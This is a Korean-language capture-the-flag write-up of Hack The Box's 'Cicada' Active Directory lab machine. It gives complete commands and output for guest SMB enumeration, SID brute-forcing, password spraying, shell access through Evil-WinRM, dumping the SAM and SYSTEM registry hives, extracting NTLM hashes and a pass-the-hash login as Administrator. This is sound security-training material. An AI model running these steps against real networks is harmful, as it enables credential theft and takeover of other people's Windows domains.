---
layout: post
title: "[HTB][AD][Easy] Cicada"
date:   2026-11-09 20:59:03 +09:00
categories: [AD, Easy]
---
**작성일:** 2025년 1월 17일 / 문서 번호 D25.100.319
**작성자:** Pho3
**머신 제작자:** theblxckcicada
**난이도:** 쉬움 (Easy)
**분류:** 공식 (Official)

### 개요 (Synopsis)
Cicada는 초보자 수준의 Active Directory 열거 및 악용에 중점을 둔 쉬움 난이도의 Windows 머신이다. 이 머신에서 플레이어는 도메인을 열거하고, 사용자를 식별하며, 공유 폴더를 탐색하고, 파일에 저장된 평문 비밀번호를 찾아냅니다. 또한 비밀번호 스프레이(password spray)를 실행하고 `SeBackupPrivilege`를 사용하여 시스템을 완전히 장악하게 된다.

### 요구 기술 (Skills Required)
* Windows에 대한 기본 지식
* 기본 열거 기술 (Basic Enumeration Skills)

### 습득 기술 (Skills Learned)
* Active Directory 열거 및 권한 상승
* 비밀번호 스프레이 (Password Spraying)
* `SeBackupPrivilege` 악용
* Pass-the-Hash 공격

---

## 열거 (Enumeration)

### Nmap
평소와 같이 Nmap 스캔으로 시작해 보면 여러 포트가 열려 있는 것을 볼 수 있다. Kerberos(포트 88) 및 LDAP/S(포트 389, 636, 3268, 3269)와 같은 서비스를 통해 Windows 호스트를 다루게 될 것임을 알 수 있다. 또한 도메인이 `cicada.htb`이고 호스트가 `CICADA-DC`인 것도 확인할 수 있다.

```bash
nmap -sC -sV -Pn TARGET_IP
```

```text
Starting Nmap 7.94SVN (https://nmap.org) at 2025-01-07 11:59 EET
Nmap scan report for TARGET_IP
Host is up (0.094s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-07 16:59:36Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
<...SNIP...>
```

도메인 이름과 IP 주소 간의 연결을 해결하기 위해 도메인 이름을 `/etc/hosts` 파일에 추가하고 추가 열거를 진행한다.
```bash
echo "TARGET_IP cicada.htb" | sudo tee -a /etc/hosts
```
웹 인터페이스가 없으므로 가장 먼저 확인해 볼 수 있는 것은 SMB 공유 폴더이다.

### SMB
익명 사용자가 SMB 공유 드라이브에 접근할 수 있는지 확인하는 것으로 시작한다. 도메인(사용자, 파일/디렉터리, 공유 포함) 열거를 자동화하는 데 자주 쓰이는 도구인 `crackmapexec`를 사용할 것이다. 이 도구는 또한 (나중에 볼 수 있듯이) 제공된 자격 증명으로 무차별 대입 공격을 하거나 Active Directory 환경에서 사용자 이름과 해시된 비밀번호를 덤프할 수도 있다.
프로토콜, 도메인 이름, `--shares` 매개변수를 지정하여 SMB 공유를 열거한다.

```bash
crackmapexec smb cicada.htb --shares
```
```text
SMB         cicada.htb      445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         cicada.htb      445    CICADA-DC        [-] Error enumerating shares: STATUS_USER_SESSION_DELETED
```

사용자를 지정하지 않고 공유를 열거하려고 하면 접근이 거부된다. 따라서 비밀번호가 없는 `guest` 사용자와 같이 흔히 사용될 수 있는 자격 증명을 시도해 볼 수 있다.

```bash
crackmapexec smb cicada.htb -u 'guest' -p '' --shares
```

```text
SMB         cicada.htb      445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         cicada.htb      445    CICADA-DC        [+] cicada.htb\guest: 
SMB         cicada.htb      445    CICADA-DC        [+] Enumerated shares
SMB         cicada.htb      445    CICADA-DC        Share           Permissions     Remark
SMB         cicada.htb      445    CICADA-DC        -----           -----------     ------
SMB         cicada.htb      445    CICADA-DC        ADMIN$                          Remote Admin
SMB         cicada.htb      445    CICADA-DC        C$                              Default share
SMB         cicada.htb      445    CICADA-DC        DEV                             
SMB         cicada.htb      445    CICADA-DC        HR              READ            
SMB         cicada.htb      445    CICADA-DC        IPC$            READ            Remote IPC
SMB         cicada.htb      445    CICADA-DC        NETLOGON                        Logon server share
SMB         cicada.htb      445    CICADA-DC        SYSVOL                          Logon server share
```

성공한 것으로 보이며, `guest` 사용자가 `HR` 공유 폴더에 접근할 수 있다. 이제 `smbclient`를 사용하여 공유 폴더에 접속해 안에 어떤 파일이 있는지 살펴본다.

```bash
smbclient //cicada.htb/HR
```

```text
Password for [WORKGROUP\phoe]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Mar 14 14:29:09 2024
  ..                                  D        0  Thu Mar 14 14:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 20:31:48 2024

                4168447 blocks of size 4096. 381377 blocks available
smb: \> get "Notice from HR.txt"
getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (3.2 KiloBytes/sec) (average 3.2 KiloBytes/sec)
```

`dir` 명령을 사용하여 내용을 나열하면 `Notice from HR.txt` 파일이 보이고, `get` 명령을 사용해 이를 우리 머신으로 다운로드할 수 있다.
파일을 열어보면 기본 비밀번호가 드러납니다!

```text
Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:
1. Log in to your Cicada Corp account using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```

### Lookupsid
이 비밀번호를 찾았으므로 아직 이 기본 비밀번호를 사용 중인 계정이 있는지 확인할 수 있다. 이를 위해서는 도메인에 있는 모든 사용자를 알아내야 하며, Impacket의 `lookupsid` 모듈을 사용하여 수행할 수 있다. 이 도구는 AD 도메인에 있는 사용자들의 Windows 보안 식별자(SID)에 대해 무차별 대입 공격을 시도한다. 각 사용자는 고유한 SID를 가지며, 이는 상대 식별자(RID)와 도메인 SID가 결합된 형태이다. 사용자 SID는 일반적으로 도메인 컨트롤러에서 발급하며, 로그인 시 생성되는 액세스 토큰의 일부를 구성하는 등 권한 부여 및 액세스 메커니즘에서 사용된다.

도메인을 열거하기 위해 `guest` 사용자, 도메인 이름, 그리고 비밀번호가 없음을 의미하는 `-no-pass`를 지정한다.

```bash
impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass
```

```text
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Brute forcing SIDs at cicada.htb
[*] StringBinding ncacn_np:cicada.htb[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-917908876-1423158569-3159038727
498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: CICADA\Administrator (SidTypeUser)
501: CICADA\Guest (SidTypeUser)
502: CICADA\krbtgt (SidTypeUser)
512: CICADA\Domain Admins (SidTypeGroup)
513: CICADA\Domain Users (SidTypeGroup)
514: CICADA\Domain Guests (SidTypeGroup)
515: CICADA\Domain Computers (SidTypeGroup)
516: CICADA\Domain Controllers (SidTypeGroup)
517: CICADA\Cert Publishers (SidTypeAlias)
518: CICADA\Schema Admins (SidTypeGroup)
519: CICADA\Enterprise Admins (SidTypeGroup)
520: CICADA\Group Policy Creator Owners (SidTypeGroup)
521: CICADA\Read-only Domain Controllers (SidTypeGroup)
522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
525: CICADA\Protected Users (SidTypeGroup)
526: CICADA\Key Admins (SidTypeGroup)
527: CICADA\Enterprise Key Admins (SidTypeGroup)
553: CICADA\RAS and IAS Servers (SidTypeAlias)
571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
1000: CICADA\CICADA-DC$ (SidTypeUser)
1101: CICADA\DnsAdmins (SidTypeAlias)
1102: CICADA\DnsUpdateProxy (SidTypeGroup)
1103: CICADA\Groups (SidTypeGroup)
1104: CICADA\john.smoulder (SidTypeUser)
1105: CICADA\sarah.dantelia (SidTypeUser)
1106: CICADA\michael.wrightson (SidTypeUser)
1108: CICADA\david.orelious (SidTypeUser)
1109: CICADA\Dev Support (SidTypeGroup)
1601: CICADA\emily.oscars (SidTypeUser)
```

결과에서 도메인 내의 그룹, 사용자, 별칭(alias)을 찾아 도메인의 전체적인 구조를 이해하는 데 도움을 얻을 수 있다. 사용자 목록이 필요하므로 `SidTypeUser` 범주에 속하는 모든 항목을 추출할 것이다. 이 작업을 수동으로 수행하지 않기 위해 몇 가지 추가 인수를 사용하여 명령을 다시 실행한다. `grep`을 사용하여 사용자만 선택하도록 필터링하고 `sed`를 사용하여 이름 외의 다른 텍스트를 제거한다. 그런 다음 결과물들을 `users.txt`라는 파일로 저장한다.

```bash
impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass | grep 'SidTypeUser' | sed 's/.*\\\(.*\) (SidTypeUser)/\1/' > users.txt
```

이제 비밀번호 스프레이를 수행하여 발견한 기본 비밀번호를 여전히 가지고 있는 사용자가 있는지 테스트할 수 있다. `users.txt` 파일에는 다음 사용자들이 포함되어 있어야 한다.

```bash
cat users.txt
```
```text
Administrator
Guest
krbtgt
CICADA-DC$
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars
```

### 비밀번호 스프레이 (Password Spraying)
비밀번호 스프레이 공격을 실행하기 위해 다시 `crackmapexec`를 사용할 것이다. 찾은 사용자가 포함된 파일(`users.txt`)과 기본 비밀번호 `Cicada$M6Corpb*@Lp#nZp!8`를 지정하면 `crackmapexec`가 각 사용자 계정에 대해 해당 비밀번호를 시도한다.

```bash
crackmapexec smb cicada.htb -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
```

```text
SMB         cicada.htb      445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         cicada.htb      445    CICADA-DC        [-] cicada.htb\Administrator:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         cicada.htb      445    CICADA-DC        [-] cicada.htb\Guest:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         cicada.htb      445    CICADA-DC        [-] cicada.htb\krbtgt:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         cicada.htb      445    CICADA-DC        [-] cicada.htb\CICADA-DC$:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         cicada.htb      445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         cicada.htb      445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         cicada.htb      445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
```

`michael.wrightson` 사용자가 여전히 기본 비밀번호를 사용하고 있는 것으로 나타납니다! 올바른 자격 증명에 접근할 수 있게 되었으므로 추가 열거를 계속할 수 있다.

### 도메인 사용자 열거 (Enumerating Domain Users)
안타깝게도 `michael.wrightson`은 다른 공유 폴더에 접근할 권한이 없지만, 그의 접근 권한을 사용하여 머신의 다른 사용자를 열거하고 더 유용한 정보를 찾을 수 있는지 확인할 수 있다.

```bash
crackmapexec smb cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
```

```text
SMB         cicada.htb      445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         cicada.htb      445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
SMB         cicada.htb      445    CICADA-DC        [+] Enumerated domain user(s)
SMB         cicada.htb      445    CICADA-DC        cicada.htb\emily.oscars                  badpwdcount: 1  desc: 
SMB         cicada.htb      445    CICADA-DC        cicada.htb\david.orelious                badpwdcount: 1  desc: Just in case I forget my password is aRt$Lp#7t*VQ!3
SMB         cicada.htb      445    CICADA-DC        cicada.htb\michael.wrightson             badpwdcount: 0  desc: 
SMB         cicada.htb      445    CICADA-DC        cicada.htb\sarah.dantelia                badpwdcount: 2  desc: 
SMB         cicada.htb      445    CICADA-DC        cicada.htb\john.smoulder                 badpwdcount: 2  desc: 
SMB         cicada.htb      445    CICADA-DC        cicada.htb\krbtgt                        badpwdcount: 0  desc: Key Distribution Center Service Account
SMB         cicada.htb      445    CICADA-DC        cicada.htb\Guest                         badpwdcount: 0  desc: Built-in account for guest access to the computer/domain
SMB         cicada.htb      445    CICADA-DC        cicada.htb\Administrator                 badpwdcount: 0  desc: Built-in account for administering the computer/domain
```

`david.orelious` 사용자가 비밀번호를 잊어버릴 경우를 대비해 AD 설명(description)란에 비밀번호 `aRt$Lp#7t*VQ!3`을 저장해 둔 것을 알 수 있다! 안타깝게도 보안보다 편의성을 우선시하여 실제 환경에서도 이런 일이 종종 발생하지만, 이는 우리의 권한을 상승시키는 데 큰 도움이 될 것이다.

---

## 초기 침투 (Foothold)

`david.orelious`의 자격 증명을 획득했으므로, 그가 어떤 공유 폴더에 접근할 수 있는지 확인할 수 있다.

```bash
crackmapexec smb cicada.htb -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares
```

```text
SMB         cicada.htb      445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         cicada.htb      445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3 
SMB         cicada.htb      445    CICADA-DC        [+] Enumerated shares
SMB         cicada.htb      445    CICADA-DC        Share           Permissions     Remark
SMB         cicada.htb      445    CICADA-DC        -----           -----------     ------
SMB         cicada.htb      445    CICADA-DC        ADMIN$                          Remote Admin
SMB         cicada.htb      445    CICADA-DC        C$                              Default share
SMB         cicada.htb      445    CICADA-DC        DEV             READ            
SMB         cicada.htb      445    CICADA-DC        HR              READ            
SMB         cicada.htb      445    CICADA-DC        IPC$            READ            Remote IPC
SMB         cicada.htb      445    CICADA-DC        NETLOGON        READ            Logon server share
SMB         cicada.htb      445    CICADA-DC        SYSVOL          READ            Logon server share
```

`DEV` 공유 폴더에 접근 권한이 있는 것 같다. 그곳에 유용한 것이 있는지 살펴본다. `smbclient`를 한 번 더 사용하고 David의 자격 증명을 지정하면 흥미로운 파일을 발견할 수 있다! 우리 머신으로 다운로드하여 무엇이 포함되어 있는지 확인한다.

```bash
smbclient //cicada.htb/DEV -U 'david.orelious%aRt$Lp#7t*VQ!3'
```

```text
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Mar 14 14:31:39 2024
  ..                                  D        0  Thu Mar 14 14:21:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 20:28:22 2024

                4168447 blocks of size 4096. 413344 blocks available
smb: \> get Backup_script.ps1
getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (1.1 KiloBytes/sec) (average 1.1 KiloBytes/sec)
```

이 PowerShell 스크립트는 `C:\smb` 디렉터리의 zip 백업을 생성하고 타임스탬프가 찍힌 파일 이름으로 `D:\Backup`에 저장한다. 그런 다음 사용자에게 백업 완료 및 백업 파일 위치를 알려줍니다.
하지만 우리의 가장 큰 관심사는 우리가 사용할 수 있는 또 다른 노출된 평문 자격 증명인 `emily.oscars`와 그녀의 비밀번호 `Q!3@Lp#M6b*7t*Vt`가 스크립트 안에 하드코딩되어 있다는 점이다!

```bash
cat Backup_script.ps1
```

```powershell
$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"
$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential ($username, $password)
$datestamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$datestamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

새로운 자격 증명이 생겼으니 이를 이용해 타겟 머신에서 쉘을 얻어볼 수 있다. Evil-WinRM을 사용하여 찾은 자격 증명이 작동하는지 확인한다.

```bash
evil-winrm -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' -i cicada.htb
```

```powershell
Evil-WinRM shell v3.5
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents>
```

Emily 권한으로 WinRM 세션을 성공적으로 얻었으며, `C:\Users\emily.oscars.CICADA\Desktop` 아래 그녀의 바탕 화면으로 이동하여 사용자 플래그(user flag)를 찾을 수 있다!

---

## 권한 상승 (Privilege Escalation)

권한 상승 단계로 넘어가서, `whoami /priv` 명령을 사용하여 Emily가 현재 어떤 권한을 가지고 있는지 확인하는 것부터 시작한다.

```powershell
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> whoami /priv
```

```text
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                              State   
============================= ======================================== ======= 
SeBackupPrivilege             Back up files and directories            Enabled 
SeRestorePrivilege            Restore files and directories            Enabled 
SeShutdownPrivilege           Shut down the system                     Enabled 
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled 
```

그녀가 일반적으로 서비스 계정이나 관리자 사용자에게 주어지는 `SeBackupPrivilege` 권한을 가지고 있는 것을 볼 수 있다. 이 권한은 시스템 백업을 용이하게 하도록 설계되었으며, 그로 인해 다른 기존 권한들을 우회하면서 시스템으로 보호되는 파일에 접근할 수 있게 해줍니다. 즉, 현실적인 시나리오에서는 SYSTEM 및 SAM Windows 레지스트리 하이브(Registry Hives)와 같은 극히 민감한 파일에 사실상 무단으로 접근할 수 있으므로 일반 사용자 계정에는 이 권한이 부여되어서는 안 된다. 바로 이 하이브 파일들에 우리가 권한을 상승시키는 데 필요한 정보가 포함되어 있다!

간단히 말해, 이러한 하이브를 덤프하여 사용자 NTLM 해시를 추출할 수 있다. 그런 다음 평문 비밀번호를 알아낼 필요 없이 추출된 Administrator 해시를 사용하여 인증(Pass-the-Hash)할 수 있다. 자세히 설명하자면 다음과 같다:
* **SAM (Security Account Manager)** 하이브에는 해시된 비밀번호를 포함하여 로컬 사용자 계정 및 그룹 멤버십 정보가 포함되어 있다.
* **SYSTEM** 하이브에는 SAM에 저장된 비밀번호 해시를 해독하는 데 필요한 시스템 부팅 키(boot key)와 같은 시스템 전반의 구성 설정이 포함되어 있다.

`reg save` 명령을 사용하여 레지스트리에서 하이브를 추출하고, 현재 디렉터리에 파일로 저장할 것이다.

```powershell
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> reg save hklm\sam sam
The operation completed successfully.
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> reg save hklm\system system
The operation completed successfully.
```

이제 Evil-WinRM의 `download` 명령을 사용하여 이 두 파일을 우리의 로컬 시스템으로 다운로드할 수 있다.

```powershell
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> download sam
Info: Downloading C:\Users\emily.oscars.CICADA\Desktop\sam to sam
Info: Download successful!
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> download system
Info: Downloading C:\Users\emily.oscars.CICADA\Desktop\system to system
Info: Download successful!
```

이제 파일이 로컬 머신에 있으므로, Impacket의 `secretsdump` 모듈을 사용하여 사용자 NTLM 해시를 덤프할 수 있다. NTLM 해시는 사용자 평문 비밀번호의 암호화된 버전을 나타냅니다. 일단 해시를 추출하면 오프라인에서 해시 크랙을 시도하거나 Pass-the-Hash 공격에 사용하여 평문 비밀번호 없이 시스템에 직접 인증할 수 있다.

해시를 추출하기 위해 다음 인수를 지정한다:
* `-sam`: 암호화된 비밀번호 데이터가 포함된 SAM 파일의 로컬 경로이다.
* `-system`: SAM 파일을 해독하는 데 필요한 부팅 키가 포함된 SYSTEM 파일의 로컬 경로이다.
* `LOCAL`: 파일이 로컬에 있으며 원격으로 접근하지 않음을 나타냅니다.

```bash
impacket-secretsdump -sam sam -system system LOCAL
```

```text
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up...
```

출력 결과에서 관리자(Administrator)의 NTLM 해시 값 `2b87e7c93a3e8a0ea4a581937016f341`을 찾았다. 이를 Evil-WinRM에서 `-H` 매개변수로 전달하여 해당 계정에 해시만으로 직접 로그인하는 데 사용할 수 있다.

```bash
evil-winrm -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341 -i cicada.htb
```

```powershell
Evil-WinRM shell v3.5
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

드디어 머신을 완전히 장악(root)했다! 바탕 화면으로 이동하여 `C:\Users\Administrator\Desktop\root.txt` 위치에서 루트 플래그(root flag)를 획득할 수 있다.
